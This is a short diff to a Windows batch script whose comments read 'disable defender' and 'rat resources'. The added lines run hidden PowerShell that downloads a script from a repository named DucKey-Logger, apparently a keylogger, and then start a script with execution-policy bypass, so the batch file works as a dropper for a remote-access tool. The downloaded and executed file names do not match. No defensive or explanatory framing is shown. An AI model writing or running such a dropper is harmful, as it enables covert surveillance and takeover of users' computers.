@@ -29,8 +29,7 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 @REM disable defender
-start
 
 @REM rat resources
-@REM start powershell -ep bypass
-@REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/PrettyBoyCosmo/DucKey-Logger/refs/heads/main/p.ps1 -Outfile p.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/PrettyBoyCosmo/DucKey-Logger/refs/heads/main/p.ps1 -Outfile install.ps1"
+powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
